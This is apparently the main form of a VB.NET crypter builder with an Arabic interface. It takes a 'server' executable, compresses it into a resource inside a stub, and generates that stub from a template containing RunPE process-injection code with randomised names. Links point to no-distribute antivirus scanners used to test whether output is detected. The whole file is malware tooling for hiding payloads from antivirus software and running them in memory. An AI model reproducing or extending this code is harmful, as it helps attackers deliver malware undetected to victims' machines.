﻿Imports System.IO

Public Class Form1

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("www.chk4me.com")
    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Process.Start("http://nodistribute.com/")
    End Sub

    Private Sub LinkLabel3_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        Process.Start("http://scan.majyx.net/")
    End Sub

    Private Sub ReconButton2_Click(sender As Object, e As EventArgs) Handles ReconButton2.Click
        Dim OpenFD As New OpenFileDialog
        With OpenFD
            .Title = "اختر سيرفراً لتشفيره"
            .Filter = "تطبيقات|*.exe"
            .ShowDialog()
        End With
        TxtBox1.Text = OpenFD.FileName
    End Sub

    Private Sub ReconButton5_Click(sender As Object, e As EventArgs) Handles ReconButton5.Click
        Dim OpenFD As New OpenFileDialog
        With OpenFD
            .Title = "اختر ستيب التشفير"
            .Filter = "تطبيقات|*.exe"
            .ShowDialog()
        End With
        TxtBox3.Text = OpenFD.FileName
    End Sub

    Private Sub ReconButton1_Click(sender As Object, e As EventArgs) Handles ReconButton1.Click
        End
    End Sub

    Private Sub ReconButton4_Click(sender As Object, e As EventArgs) Handles ReconButton4.Click
        If TxtBox3.Text = "" Then
            MsgBox("الرجاء وضع ستيب التشفير", MsgBoxStyle.Critical)
            Exit Sub
        End If

        Dim kbytes() As Byte
        Dim ebytes() As Byte
        Dim SVD As New SaveFileDialog
        With SVD
            .Title = "اختر مكان حفظ السيرفر المشفر"
            .Filter = "تطبيقات|*.exe"
            .ShowDialog()
        End With
        kbytes = IO.File.ReadAllBytes(TxtBox1.Text)
        ebytes = Compression.Compress(kbytes)
        IO.File.WriteAllBytes(SVD.FileName, IO.File.ReadAllBytes(TxtBox3.Text))
        WriteResource(SVD.FileName, ebytes)
        MsgBox("تم التشفير بنجاح", MsgBoxStyle.MsgBoxRight)
    End Sub

    Private Sub ReconButton3_Click(sender As Object, e As EventArgs) Handles ReconButton3.Click
        Dim ss As String = ""
        Try
            Dim source As String = My.Resources.Sorce ' Declare temporary string storing the source for replacing
            source = source.Replace("%RunPE%", RunPEGen()) 'Generate RunPE and add to sources
            source = source.Replace("%ResWrite%", ResourceWriter2()) 'Generate RunPE and add to sources
            source = source.Replace("%namefuncRes%", namefuncRes)
            source = source.Replace("%nameclass%", nameclassRunPE)
            source = source.Replace("%namefunc%", namefunctionRunPE)
            Dim dd As String = Process.GetCurrentProcess.MainModule.ModuleName
            ss = Application.ExecutablePath.Replace(dd, "MedoStub.exe")
            iCompiler.GenerateExecutable(ss, source, "")
            MsgBox("Stub Generated", MsgBoxStyle.Information, "Coded By GAITH7H3WOLF")
        Catch ex As Exception
        End Try
        If IO.File.Exists(ss) Then TxtBox3.Text = ss
    End Sub
End Class
